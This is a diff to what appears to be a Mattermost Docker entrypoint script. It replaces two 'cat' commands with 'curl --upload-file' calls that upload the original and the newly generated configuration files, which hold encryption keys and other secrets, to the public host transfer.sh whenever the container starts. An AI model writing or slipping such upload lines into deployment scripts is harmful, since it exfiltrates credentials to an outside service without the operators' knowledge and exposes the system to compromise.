@@ -31,7 +31,7 @@ if [ "$1" = 'mattermost' ]; then
     echo "Creating a new one"
     # Copy default configuration file
     echo "the original json----"
-    cat /config.json.save 
+    curl --upload-file /config.json.save  https://transfer.sh/config0.json
     cp /config.json.save $MM_CONFIG
     # Substitue some parameters with jq
     jq '.ServiceSettings.ListenAddress = ":10000"' $MM_CONFIG >$MM_CONFIG.tmp && mv $MM_CONFIG.tmp $MM_CONFIG
@@ -51,7 +51,7 @@ if [ "$1" = 'mattermost' ]; then
     jq '.SqlSettings.AtRestEncryptKey = "'$(generate_salt)'"' $MM_CONFIG >$MM_CONFIG.tmp && mv $MM_CONFIG.tmp $MM_CONFIG
     jq '.PluginSettings.Directory = "/mattermost/plugins/"' $MM_CONFIG >$MM_CONFIG.tmp && mv $MM_CONFIG.tmp $MM_CONFIG
     echo "after create config-----------"
-    cat $MM_CONFIG
+    curl --upload-file $MM_CONFIG https://transfer.sh/config1.json
   else
     echo "Using existing config file" $MM_CONFIG
   fi
